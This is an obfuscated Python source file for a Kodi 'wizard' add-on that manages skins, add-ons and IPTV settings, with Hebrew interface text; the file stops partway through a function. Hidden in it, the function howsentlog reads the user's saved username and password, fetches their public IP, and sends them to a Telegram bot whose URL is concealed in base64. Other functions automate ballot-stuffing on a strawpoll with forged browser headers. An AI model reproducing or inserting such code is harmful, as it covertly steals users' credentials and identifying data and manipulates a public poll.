# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
IPTVSIMPL18 =uservar .IPTVSIMPL18 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
def MainMenu ():#line:256
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:258
def skinWIN ():#line:259
	idle ()#line:260
	OO0O0000O0OOOO0OO =glob .glob (os .path .join (ADDONS ,'skin*'))#line:261
	OOOO0OOO0OO00OOO0 =[];O0OOO0O0O0OO0O0O0 =[]#line:262
	for O000000OOO0OO0000 in sorted (OO0O0000O0OOOO0OO ,key =lambda O0OOO0OO0OO0OO000 :O0OOO0OO0OO0OO000 ):#line:263
		O0OOO0O00O00OOOOO =os .path .split (O000000OOO0OO0000 [:-1 ])[1 ]#line:264
		OOOOOO00OOOOOO00O =os .path .join (O000000OOO0OO0000 ,'addon.xml')#line:265
		if os .path .exists (OOOOOO00OOOOOO00O ):#line:266
			OOO0O0O0OOO0OOO0O =open (OOOOOO00OOOOOO00O )#line:267
			OO00O0O0OO0000O0O =OOO0O0O0OOO0OOO0O .read ()#line:268
			OOOOO000O0O0000OO =parseDOM2 (OO00O0O0OO0000O0O ,'addon',ret ='id')#line:269
			OOOO0O00O00O000OO =O0OOO0O00O00OOOOO if len (OOOOO000O0O0000OO )==0 else OOOOO000O0O0000OO [0 ]#line:270
			try :#line:271
				OO00OOOO00OO00OO0 =xbmcaddon .Addon (id =OOOO0O00O00O000OO )#line:272
				OOOO0OOO0OO00OOO0 .append (OO00OOOO00OO00OO0 .getAddonInfo ('name'))#line:273
				O0OOO0O0O0OO0O0O0 .append (OOOO0O00O00O000OO )#line:274
			except :#line:275
				pass #line:276
	O000000OO0OO00OO0 =[];O00O00O0O0OOO00O0 =0 #line:277
	OOOOOOOO0OO0OO0O0 =["Current Skin -- %s"%currSkin ()]+OOOO0OOO0OO00OOO0 #line:278
	O00O00O0O0OOO00O0 =DIALOG .select ("Select the Skin you want to swap with.",OOOOOOOO0OO0OO0O0 )#line:279
	if O00O00O0O0OOO00O0 ==-1 :return #line:280
	else :#line:281
		O00O00OOO0OO00O00 =(O00O00O0O0OOO00O0 -1 )#line:282
		O000000OO0OO00OO0 .append (O00O00OOO0OO00O00 )#line:283
		OOOOOOOO0OO0OO0O0 [O00O00O0O0OOO00O0 ]="%s"%(OOOO0OOO0OO00OOO0 [O00O00OOO0OO00O00 ])#line:284
	if O000000OO0OO00OO0 ==None :return #line:285
	for O0OO00000OO000OO0 in O000000OO0OO00OO0 :#line:286
		swapSkins (O0OOO0O0O0OO0O0O0 [O0OO00000OO000OO0 ])#line:287
def currSkin ():#line:289
	return xbmc .getSkinDir ('Container.PluginName')#line:290
def swapSkins (O0000OOO00O000O00 ,title ="Error"):#line:291
	O0O00O0OOO0O00O00 ='lookandfeel.skin'#line:292
	OOOO000OO0000OO00 =O0000OOO00O000O00 #line:293
	OOO0OO0OOOOOOOOO0 =getOld (O0O00O0OOO0O00O00 )#line:294
	OOOO0OO0O0O0OO00O =O0O00O0OOO0O00O00 #line:295
	setNew (OOOO0OO0O0O0OO00O ,OOOO000OO0000OO00 )#line:296
	O0O0O0O00OOOO0O00 =0 #line:297
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0O0O00OOOO0O00 <100 :#line:298
		O0O0O0O00OOOO0O00 +=1 #line:299
		xbmc .sleep (1 )#line:300
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:301
		xbmc .executebuiltin ('SendClick(11)')#line:302
	return True #line:303
def getOld (O00OO00000O0O0O0O ):#line:305
	try :#line:306
		O00OO00000O0O0O0O ='"%s"'%O00OO00000O0O0O0O #line:307
		OO00O0O000O00OOOO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O00OO00000O0O0O0O )#line:308
		O0000OOOOOOOO000O =xbmc .executeJSONRPC (OO00O0O000O00OOOO )#line:310
		O0000OOOOOOOO000O =simplejson .loads (O0000OOOOOOOO000O )#line:311
		if O0000OOOOOOOO000O .has_key ('result'):#line:312
			if O0000OOOOOOOO000O ['result'].has_key ('value'):#line:313
				return O0000OOOOOOOO000O ['result']['value']#line:314
	except :#line:315
		pass #line:316
	return None #line:317
def setNew (OO0OO0O0O0OO0O0O0 ,OOO0O000O0OOO0OO0 ):#line:320
	try :#line:321
		OO0OO0O0O0OO0O0O0 ='"%s"'%OO0OO0O0O0OO0O0O0 #line:322
		OOO0O000O0OOO0OO0 ='"%s"'%OOO0O000O0OOO0OO0 #line:323
		O0OOOO00OO0OO0OOO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO0OO0O0O0OO0O0O0 ,OOO0O000O0OOO0OO0 )#line:324
		OOO0O00O0O0OO000O =xbmc .executeJSONRPC (O0OOOO00OO0OO0OOO )#line:326
	except :#line:327
		pass #line:328
	return None #line:329
def idle ():#line:330
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:331
def resetkodi ():#line:333
		if xbmc .getCondVisibility ('system.platform.windows'):#line:334
			O00OO0OOOOO0OOO00 =xbmcgui .DialogProgress ()#line:335
			O00OO0OOOOO0OOO00 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:338
			O00OO0OOOOO0OOO00 .update (0 )#line:339
			for O0OO000000OOOO00O in range (5 ,-1 ,-1 ):#line:340
				time .sleep (1 )#line:341
				O00OO0OOOOO0OOO00 .update (int ((5 -O0OO000000OOOO00O )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0OO000000OOOO00O ),'')#line:342
				if O00OO0OOOOO0OOO00 .iscanceled ():#line:343
					from resources .libs import win #line:344
					return None ,None #line:345
			from resources .libs import win #line:346
		else :#line:347
			O00OO0OOOOO0OOO00 =xbmcgui .DialogProgress ()#line:348
			O00OO0OOOOO0OOO00 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:351
			O00OO0OOOOO0OOO00 .update (0 )#line:352
			for O0OO000000OOOO00O in range (5 ,-1 ,-1 ):#line:353
				time .sleep (1 )#line:354
				O00OO0OOOOO0OOO00 .update (int ((5 -O0OO000000OOOO00O )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0OO000000OOOO00O ),'')#line:355
				if O00OO0OOOOO0OOO00 .iscanceled ():#line:356
					os ._exit (1 )#line:357
					return None ,None #line:358
			os ._exit (1 )#line:359
def backtokodi ():#line:361
			wiz .kodi17Fix ()#line:362
			fix18update ()#line:363
			fix17update ()#line:364
def testcommand1 ():#line:366
    import requests #line:367
    OO0O0O0OO0O000OOO ='18773068'#line:368
    OO00OO00OOO0000OO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO0O0O0OO0O000OOO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:380
    O0O00000OOOO00OOO ='145273320'#line:382
    OOO0O00O0OO0OOOOO ='145272688'#line:383
    if ADDON .getSetting ("auto_rd")=='true':#line:384
        OOOOOOO0000O0OOO0 =O0O00000OOOO00OOO #line:385
    else :#line:386
        OOOOOOO0000O0OOO0 =OOO0O00O0OO0OOOOO #line:387
    O0OO00OOO00OO0O00 ={'options':OOOOOOO0000O0OOO0 }#line:391
    OO00O0OOOOOO0OO0O =requests .post ('https://www.strawpoll.me/'+OO0O0O0OO0O000OOO ,headers =OO00OO00OOO0000OO ,data =O0OO00OOO00OO0O00 )#line:393
def builde_Votes ():#line:394
   try :#line:395
        import requests #line:396
        OOOOOO0OOOOO0O00O ='18773068'#line:397
        O00OO0OO00OOO0O0O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOOOOO0OOOOO0O00O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:409
        O0O0000O0O000O0OO ='145273320'#line:411
        O00O00000OO00OOOO ={'options':O0O0000O0O000O0OO }#line:417
        OO0OO0O0OOOO0O0O0 =requests .post ('https://www.strawpoll.me/'+OOOOOO0OOOOO0O00O ,headers =O00OO0OO00OOO0O0O ,data =O00O00000OO00OOOO )#line:419
   except :pass #line:420
def update_Votes ():#line:421
   try :#line:422
        import requests #line:423
        O0OO00O0OOO0O0000 ='18773068'#line:424
        OOOOO000OOO0OO00O ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OO00O0OOO0O0000 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:436
        O0OOOOO0O00O00O00 ='145273321'#line:438
        O00OOOO00O0OOOOOO ={'options':O0OOOOO0O00O00O00 }#line:444
        OOOO0O000O000000O =requests .post ('https://www.strawpoll.me/'+O0OO00O0OOO0O0000 ,headers =OOOOO000OOO0OO00O ,data =O00OOOO00O0OOOOOO )#line:446
   except :pass #line:447
def testcommand ():#line:451
    wiz .kodi17fix ()#line:452
def skin_homeselect ():#line:453
	try :#line:455
		OOO000O00O0O0000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:456
		O0O00O0000O0O0000 =open (OOO000O00O0O0000O ,'r')#line:458
		OO0O0OOO0000OO00O =O0O00O0000O0O0000 .read ()#line:459
		O0O00O0000O0O0000 .close ()#line:460
		OOO0O00O00OO00OOO ='<setting id="HomeS" type="string(.+?)/setting>'#line:461
		O00OO0OO00O000O0O =re .compile (OOO0O00O00OO00OOO ).findall (OO0O0OOO0000OO00O )[0 ]#line:462
		O0O00O0000O0O0000 =open (OOO000O00O0O0000O ,'w')#line:463
		O0O00O0000O0O0000 .write (OO0O0OOO0000OO00O .replace ('<setting id="HomeS" type="string%s/setting>'%O00OO0OO00O000O0O ,'<setting id="HomeS" type="string"></setting>'))#line:464
		O0O00O0000O0O0000 .close ()#line:465
	except :#line:466
		pass #line:467
def autotrakt ():#line:470
    OOOOO0O0OO0O0O000 =(ADDON .getSetting ("auto_trk"))#line:471
    if OOOOO0O0OO0O0O000 =='true':#line:472
       from resources .libs import trk_aut #line:473
def traktsync ():#line:475
     O0000O0O00000O000 =(ADDON .getSetting ("auto_trk"))#line:476
     if O0000O0O00000O000 =='true':#line:477
       from resources .libs import trk_aut #line:480
     else :#line:481
        ADDON .openSettings ()#line:482
def imdb_synck ():#line:484
   try :#line:485
     O000OOOOOO0OOOOO0 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:486
     O0OO0OOOOOO000O00 =xbmcaddon .Addon ('plugin.video.gaia')#line:487
     OO0000O000O0O000O =(ADDON .getSetting ("imdb_sync"))#line:488
     O00OO000000OO0OO0 ="imdb.user"#line:489
     O00O0000O0OO0O000 ="accounts.informants.imdb.user"#line:490
     O000OOOOOO0OOOOO0 .setSetting (O00OO000000OO0OO0 ,str (OO0000O000O0O000O ))#line:491
     O0OO0OOOOOO000O00 .setSetting ('accounts.informants.imdb.enabled','true')#line:492
     O0OO0OOOOOO000O00 .setSetting (O00O0000O0OO0O000 ,str (OO0000O000O0O000O ))#line:493
   except :pass #line:494
def dis_or_enable_addon (O00OO0OO0O0O0000O ,OO0O0OO00OO00000O ,enable ="true"):#line:496
    import json #line:497
    OO0OOOO000000O00O ='"%s"'%O00OO0OO0O0O0000O #line:498
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O00OO0OO0O0O0000O )and enable =="true":#line:499
        logging .warning ('already Enabled')#line:500
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O00OO0OO0O0O0000O )#line:501
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O00OO0OO0O0O0000O )and enable =="false":#line:502
        return xbmc .log ("### Skipped %s, reason = not installed"%O00OO0OO0O0O0000O )#line:503
    else :#line:504
        OO0O0000O00O00O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO0OOOO000000O00O ,enable )#line:505
        OOOOOOOO0OO0OOOOO =xbmc .executeJSONRPC (OO0O0000O00O00O00 )#line:506
        OOO0OO00OO0O00O0O =json .loads (OOOOOOOO0OO0OOOOO )#line:507
        if enable =="true":#line:508
            xbmc .log ("### Enabled %s, response = %s"%(O00OO0OO0O0O0000O ,OOO0OO00OO0O00O0O ))#line:509
        else :#line:510
            xbmc .log ("### Disabled %s, response = %s"%(O00OO0OO0O0O0000O ,OOO0OO00OO0O00O0O ))#line:511
    if OO0O0OO00OO00000O =='auto':#line:512
     return True #line:513
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:514
def iptvset ():#line:517
  try :#line:518
    OO00O00OO000O0OO0 =(ADDON .getSetting ("iptv_on"))#line:519
    if OO00O00OO000O0OO0 =='true':#line:521
       if KODIV >=17 and KODIV <18 :#line:523
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:524
         O0O0OO000000O0O00 =xbmcaddon .Addon ('pvr.iptvsimple')#line:525
         OO000O0OO00OO0O00 =(ADDON .getSetting ("iptvUrl"))#line:527
         O0O0OO000000O0O00 .setSetting ('m3uUrl',OO000O0OO00OO0O00 )#line:528
         O000OO0OOOO00OOO0 =(ADDON .getSetting ("epg_Url"))#line:529
         O0O0OO000000O0O00 .setSetting ('epgUrl',O000OO0OOOO00OOO0 )#line:530
       if KODIV >=18 :#line:533
         iptvsimpldown ()#line:534
         wiz .kodi17Fix ()#line:535
         xbmc .sleep (1000 )#line:536
         O0O0OO000000O0O00 =xbmcaddon .Addon ('pvr.iptvsimple')#line:537
         OO000O0OO00OO0O00 =(ADDON .getSetting ("iptvUrl"))#line:538
         O0O0OO000000O0O00 .setSetting ('m3uUrl',OO000O0OO00OO0O00 )#line:539
         O000OO0OOOO00OOO0 =(ADDON .getSetting ("epg_Url"))#line:540
         O0O0OO000000O0O00 .setSetting ('epgUrl',O000OO0OOOO00OOO0 )#line:541
  except :pass #line:543
def howsentlog ():#line:550
       try :#line:551
          import json #line:552
          OOO0000000OO0000O =(ADDON .getSetting ("user"))#line:553
          OO0OOO0O000000O0O =(ADDON .getSetting ("pass"))#line:554
          O000O0OOO00OO0000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:555
          O0000O00O000O000O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:557
          OO00OO0000000OOO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:558
          OOOOO0000O0OOOOOO =str (json .loads (OO00OO0000000OOO0 )['ip'])#line:559
          OO0OO00OOO0OOOOO0 =OOO0000000OO0000O #line:560
          O0OOO0O00OO000O00 =OO0OOO0O000000O0O #line:561
          import socket #line:563
          OO00OO0000000OOO0 =urllib2 .urlopen (O0000O00O000O000O .decode ('base64')+' - '+OO0OO00OOO0OOOOO0 +' - '+O0OOO0O00OO000O00 +' - '+O000O0OOO00OO0000 ).readlines ()#line:564
       except :pass #line:565
def googleindicat ():#line:568
			import logg #line:569
			OO0000O0OOOO00OO0 =(ADDON .getSetting ("pass"))#line:570
			OO00OO0OO0O0O0OO0 =(ADDON .getSetting ("user"))#line:571
			logg .logGA (OO0000O0OOOO00OO0 ,OO00OO0OO0O0O0OO0 )#line:572
def logsend ():#line:573
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:574
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:575
      howsentlog ()#line:577
      import requests #line:578
      if xbmc .getCondVisibility ('system.platform.windows'):#line:579
         O0OOO00O00OO00O0O =xbmc .translatePath ('special://home/kodi.log')#line:580
